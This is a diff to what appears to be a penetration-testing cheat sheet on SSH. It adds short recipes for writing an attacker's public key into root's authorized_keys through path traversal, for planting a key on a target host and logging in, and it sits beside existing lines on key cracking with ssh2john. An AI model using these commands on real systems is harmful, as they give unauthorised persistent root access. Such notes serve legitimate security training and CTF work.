@@ -30,6 +30,25 @@ scp -i id_rsa -O authorized_keys max@sorcerer:/home/max/.ssh/authorized_keys
 # Then ssh in
 ```
 
+#### Overwrite or Modify authorized_keys
+
+```bash
+ssh-keygen
+cat key.pub > ../../../../../../../../../../root/.ssh/authorized_keys
+ssh -i key root@ip
+```
+
+#### Upload SSH Key Properly
+
+```bash
+ssh-keygen -t rsa
+chmod 600 file
+chmod 666 file.pub
+mv file.pub authorized_keys
+# Copy the contents of (authorized_keys) file.pub to their authorized_keys file
+ssh -i file user@host
+```
+
 ##### Cracking Private Key
 ````
 ssh2john id_ecdsa > id_ecdsa.hash
